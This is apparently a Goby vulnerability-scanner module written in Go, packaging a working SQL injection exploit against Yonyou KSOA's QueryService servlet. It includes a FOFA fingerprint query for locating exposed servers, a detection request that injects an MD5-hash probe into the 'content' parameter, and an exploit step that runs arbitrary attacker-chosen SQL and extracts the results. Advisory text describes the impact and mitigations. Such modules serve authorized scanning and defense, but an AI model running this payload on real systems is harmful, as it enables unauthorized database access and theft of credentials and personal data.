package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyou KSOA QueryService SQL Injection vulnerability",
    "Description": "<p>Yonyou KSOA spacetime is based on the KSOA concept under the guidance of research and development of a new generation of products, is according to the forefront of circulation enterprises IT requirements to launch the unification of the IT infrastructure, IT can make circulation enterprises established between IT systems in different historical periods, relaxed conversation with each other, help circulation enterprises to protect the existing IT investments, simplify IT management, enhance competition ability, Ensure that the overall strategic objectives and innovation activities of the enterprise are achieved. SQL injection vulnerability exists in some function of Yonyou spatio-temporal KSOA, which can be used by attackers to obtain database sensitive information.</p>",
    "Product": "yonyou-Time-and-Space-KSOA",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2023-01-31",
    "Author": "White_2021@163.com",
    "FofaQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\"",
    "GobyQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), the attacker can even write Trojan horse to the server in the case of high permission to further obtain server system permission.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://fofa.info"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "select%20sys.fn_varbintohexstr(hashbytes('md5','test'))",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/servlet/com.sksoft.bill.QueryService?service=query&content=select%20sys.fn_varbintohexstr(hashbytes('md5','test'))",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "0x098f6bcd4621d373cade4e832627b4f6",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/servlet/com.sksoft.bill.QueryService?service=query&content={{{sql}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<d>(.*?)</d>"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "用友时空 KSOA QueryService 处 content 参数 SQL 注入漏洞",
            "Product": "用友-时空KSOA",
            "Description": "<p>用友时空KSOA是建立在SOA理念指导下研发的新一代产品，是根据流通企业前沿的IT需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的IT系统之间彼此轻松对话，帮助流通企业保护原有的IT投资，简化IT管理，提升竞争能力，确保企业整体的战略目标以及创新活动的实现。</p><p>用友时空KSOA系统中QueryService处存在sql注入漏洞，攻击者利用漏洞可以获取数据库敏感信息。<br><br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yonyou KSOA QueryService SQL Injection vulnerability",
            "Product": "yonyou-Time-and-Space-KSOA",
            "Description": "<p>Yonyou KSOA spacetime is based on the KSOA concept under the guidance of research and development of a new generation of products, is according to the forefront of circulation enterprises IT requirements to launch the unification of the IT infrastructure, IT can make circulation enterprises established between IT systems in different historical periods, relaxed conversation with each other, help circulation enterprises to protect the existing IT investments, simplify IT management, enhance competition ability, Ensure that the overall strategic objectives and innovation activities of the enterprise are achieved. SQL injection vulnerability exists in some function of Yonyou spatio-temporal KSOA, which can be used by attackers to obtain database sensitive information.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a><br></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), the attacker can even write Trojan horse to the server in the case of high permission to further obtain server system permission.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10805"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}